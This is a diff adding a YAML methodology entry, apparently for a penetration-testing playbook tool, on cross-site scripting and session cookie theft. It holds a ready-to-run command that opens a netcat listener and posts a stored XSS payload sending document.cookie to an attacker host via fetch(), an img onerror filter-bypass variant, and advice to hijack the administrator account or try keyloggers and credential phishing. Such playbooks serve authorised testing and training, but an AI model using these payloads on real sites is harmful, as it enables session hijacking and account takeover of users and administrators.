@@ -1,0 +1,34 @@
+id: xss
+name: Cross-Site Scripting (XSS) & Cookie Stealing
+category: web
+description: Methodology for Reflected and Stored XSS. Covers payload execution verification, bypassing script filters, and capturing administrator session cookies with Netcat listener.
+port_triggers:
+  - 80
+  - 443
+  - 8000
+  - 8080
+  - 8443
+  - 8978
+service_triggers:
+  - http
+  - https
+  - web
+tags:
+  - xss
+  - cookie-stealing
+  - javascript
+  - web
+steps:
+  - id: xss-cookie-stealer
+    title: Session Cookie Exfiltration Payload
+    phase: exploitation
+    purpose: Inject JavaScript that sends the authenticated user or admin session cookies back to your Kali listener.
+    command: nc -lvnp 8000 & curl -s -X POST -d "comment=<script>fetch('http://{{LHOST|10.10.14.2}}:8000/?c='+document.cookie)</script>" "{{TARGET_URL}}/comment.php"
+    expected_output:
+      - '[Listener 8000] GET /?c=PHPSESSID=9a8fbc...; admin_session=eyJhb...'
+    common_mistakes:
+      - 'If `<script>` tags are stripped, use image event handler: `<img src=x onerror="fetch(''http://{{LHOST}}:8000/?c=''+document.cookie)">`.'
+    if_success: Session cookie captured! Import cookie into browser to hijack administrator account.
+    if_failure: Cookie has `HttpOnly` flag. Try keylogger payload or form credential phishing.
+    references:
+      - https://portswigger.net/web-security/cross-site-scripting
